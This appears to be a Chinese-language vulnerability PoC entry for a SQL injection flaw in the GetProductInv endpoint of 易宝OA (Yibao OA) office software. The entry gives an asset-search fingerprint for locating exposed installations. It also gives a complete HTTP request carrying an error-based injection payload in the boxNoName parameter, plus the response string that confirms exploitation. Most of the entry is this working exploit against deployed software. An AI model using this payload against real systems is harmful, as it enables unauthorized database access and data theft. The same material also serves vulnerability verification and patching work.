﻿# 易宝OA GetProductInv接口 SQL注入漏洞

> 更新时间：2024-04-07

> 漏洞编号：

> 漏洞说明：易宝OA是一款功能非常强大的办公软件。用户通过软件里可以轻松的进行移动办公，功能非常的丰富，可以满足用户的各种办公需求，让你的办公效率有了有效的提高，通过软件里可以轻松的解决用户的各种办公事项。易宝OA GetProductInv接口存在SQL注入漏洞。

> 漏洞特征：app="顶讯科技-易宝OA系统"

> 验证脚本：HTTP

```
GET /SmartTradeScan/Inventory/GetProductInv?boxNoName=1%27%20AND%201411%20IN%20(SELECT%20(CHAR(113)%2bCHAR(98)%2bCHAR(112)%2bCHAR(112)%2bCHAR(113)%2b(SELECT%20(CASE%20WHEN%20(1411=1411)%20THEN%20CHAR(49)%20ELSE%20CHAR(48)%20END))%2bCHAR(113)%2bCHAR(120)%2bCHAR(122)%2bCHAR(122)%2bCHAR(113)))--%20YyAm&positionName=2&productID=3&opeID=4 HTTP/1.1
Accept: */*
Connection: Keep-Alive
```

> 响应代码特征：200

> 响应内容特征：qbppqlqxzzq

> 上传文件定位：

> 验证文件来源：易宝OA GetProductInv接口 SQL注入漏洞.poc

